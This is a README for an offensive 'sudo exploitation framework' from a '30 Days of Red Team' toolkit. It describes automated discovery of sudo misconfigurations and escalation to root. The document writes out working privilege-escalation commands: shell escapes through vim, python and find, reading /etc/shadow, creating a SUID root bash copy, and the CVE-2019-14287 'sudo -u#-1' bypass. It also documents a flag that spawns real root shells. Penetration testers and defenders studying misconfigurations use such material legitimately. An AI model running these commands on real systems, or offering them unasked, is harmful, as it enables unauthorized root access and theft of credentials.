# RT Sudo Exploitation Framework

> **Part of the 30 Days of Red Team Toolkit**

A modular framework for discovering and exploiting sudo misconfigurations.

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     Sudo Exploitation Framework                               â•‘
â•‘     "sudo make me a sandwich. sudo make me root."             â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

## ğŸ¯ Features

- **Intelligent sudo -l Parsing**: Extracts permissions, NOPASSWD flags, and run-as users
- **Comprehensive GTFOBins Database**: 60+ binaries with sudo exploitation techniques
- **Version Vulnerability Checks**: CVE-2021-3156 (Baron Samedit), CVE-2019-14287
- **NOPASSWD Prioritization**: Exploits passwordless commands first
- **Safe Test Mode**: Runs `id` instead of spawning shells by default
- **Detailed Reports**: JSON reports and exploitation guides

## ğŸ“¦ Installation

```bash
# Clone or copy the rt_sudo_exploiter directory
cd /path/to/toolkit

# Run directly
python3 -m rt_sudo_exploiter

# Or import in your scripts
from rt_sudo_exploiter import SudoExploiter
```

## ğŸš€ Quick Start

### Command Line

```bash
# Auto-scan and exploit (safe test mode)
python3 -m rt_sudo_exploiter

# Scan only - no exploitation
python3 -m rt_sudo_exploiter --scan

# Exploit specific binary
python3 -m rt_sudo_exploiter --exploit vim

# List techniques for a binary
python3 -m rt_sudo_exploiter --list python

# List all known binaries
python3 -m rt_sudo_exploiter --all-binaries

# Spawn actual shell (not test mode)
python3 -m rt_sudo_exploiter --exploit find --no-test
```

### Python API

```python
from rt_sudo_exploiter import SudoExploiter

# Initialize
exploiter = SudoExploiter()

# Scan only
result = exploiter.scan()

# Scan and exploit
result = exploiter.scan_and_exploit()

# Exploit specific binary
result = exploiter.exploit_specific('vim')

# Save reports
exploiter.save_report(result)
exploiter.generate_exploit_guide(result)

# List techniques
exploiter.list_techniques('find')
```

## ğŸ“Š Understanding sudo -l Output

The framework parses various sudo permission formats:

```
# Simple permission
(root) /usr/bin/vim

# With NOPASSWD
(root) NOPASSWD: /usr/bin/find

# Full access
(ALL : ALL) ALL

# Multiple commands
(root) /usr/bin/vim, /usr/bin/less, /usr/bin/cat

# With arguments
(root) /usr/bin/vim /etc/hosts
```

### Permission Priority

1. **ALL permission**: Full root access - instant win
2. **NOPASSWD commands**: No password required - highest priority
3. **Regular sudo commands**: May require password

## ğŸ”§ Supported Binaries

The framework includes 60+ binaries with sudo exploitation:

### Shells
`bash`, `sh`, `dash`, `zsh`

### Languages
`python`, `python3`, `perl`, `ruby`, `php`, `lua`, `node`

### Editors
`vim`, `vi`, `nano`, `emacs`, `ed`

### Pagers
`less`, `more`, `man`

### File Utilities
`find`, `cp`, `mv`, `cat`, `head`, `tail`, `dd`, `tee`

### Text Processing
`awk`, `gawk`, `sed`

### Network Tools
`nmap`, `socat`, `wget`, `curl`, `ftp`, `ssh`, `nc`

### System Tools
`env`, `systemctl`, `journalctl`, `mount`, `docker`, `service`

### And many more...

## ğŸ“‹ Exploitation Techniques

Each binary has categorized techniques:

```python
# Shell spawning
"sudo vim -c ':!/bin/sh'"
"sudo python -c 'import os; os.system(\"/bin/sh\")'"

# File reading
"sudo cat /etc/shadow"
"sudo curl file:///etc/shadow"

# SUID creation
"sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash"
```

## âš ï¸ Version Vulnerabilities

The framework checks for known sudo vulnerabilities:

### CVE-2021-3156 (Baron Samedit)
- Affects: sudo < 1.9.5p2
- Type: Heap-based buffer overflow
- Impact: Local privilege escalation

### CVE-2019-14287
- Affects: sudo < 1.8.28
- Type: User ID bypass
- Command: `sudo -u#-1 /bin/bash`

## ğŸ“Š Output Files

```
/tmp/sudo_exploit/
â”œâ”€â”€ sudo_report.json      # Full JSON report
â””â”€â”€ exploit_guide.txt     # Quick exploitation reference
```

### Sample Output

```
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
SUDO PERMISSION ENUMERATION
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[*] Sudo version: Sudo version 1.8.31
[*] Checking for version vulnerabilities...
[+] POTENTIALLY VULNERABLE TO CVE-2021-3156!

[*] Checking sudo permissions (sudo -l)...
[+] Got sudo permissions:
    (root) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/find

[+] EXPLOITABLE: sudo vim [NOPASSWD]
[+] EXPLOITABLE: sudo find

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EXPLOITATION PHASE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[*] Trying: sudo vim (NOPASSWD - priority)
[+] ROOT ACHIEVED via sudo vim!
```

## ğŸ—ï¸ Architecture

```
rt_sudo_exploiter/
â”œâ”€â”€ __init__.py          # Package exports
â”œâ”€â”€ __main__.py          # CLI entry point
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ gtfobins.py      # GTFOBins sudo database (60+ binaries)
â”‚   â”œâ”€â”€ permissions.py   # Data structures
â”‚   â””â”€â”€ exploiter.py     # Main orchestrator
â”œâ”€â”€ parsers/
â”‚   â””â”€â”€ sudo_parser.py   # sudo -l output parsing
â””â”€â”€ README.md
```

## ğŸ” Common Sudo Misconfigurations

### 1. NOPASSWD on dangerous binaries
```
(root) NOPASSWD: /usr/bin/vim
```
**Exploit**: `sudo vim -c ':!/bin/sh'`

### 2. Wildcard permissions
```
(root) /usr/bin/find *
```
**Exploit**: `sudo find . -exec /bin/sh \; -quit`

### 3. ALL permission
```
(ALL : ALL) ALL
```
**Exploit**: `sudo su -`

### 4. Script execution
```
(root) /usr/bin/python /opt/scripts/*.py
```
**Exploit**: Create malicious script matching pattern

## ğŸ“š Resources

- [GTFOBins - Sudo](https://gtfobins.github.io/#+sudo)
- [HackTricks - Sudo](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
- [CVE-2021-3156 Analysis](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

## âš ï¸ Legal Disclaimer

This tool is intended for **authorized security testing only**.

- Always obtain proper authorization before testing
- Use responsibly in controlled environments
- The authors are not responsible for misuse

---

**30 Days of Red Team** | *From Zero Access to Domain Admin*